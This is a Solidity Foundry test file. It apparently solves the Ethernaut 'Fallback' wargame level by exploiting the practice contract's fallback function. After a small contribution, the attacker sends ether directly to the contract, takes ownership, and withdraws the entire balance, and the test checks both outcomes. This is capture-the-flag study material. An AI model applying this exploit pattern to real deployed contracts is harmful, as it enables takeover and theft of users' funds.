// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/01_Fallback.sol";

contract FallbackTest is Test {
    address private owner = makeAddr("owner");
    Fallback private fallBack;

    function setUp() public {
        vm.prank(owner);
        fallBack = new Fallback();
    }

    function test_FallbackExploitVulnerability() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);
        fallBack.contribute{value: 0.0001 ether}();
        address(fallBack).call{value: 0.0001 ether}("");
        fallBack.withdraw();
        vm.stopPrank();

        assertEq(fallBack.owner(), attacker, "Attacker should be the owner");
        assertEq(
            0,
            address(fallBack).balance,
            "Balance must be zero after malicious attack"
        );
    }
}
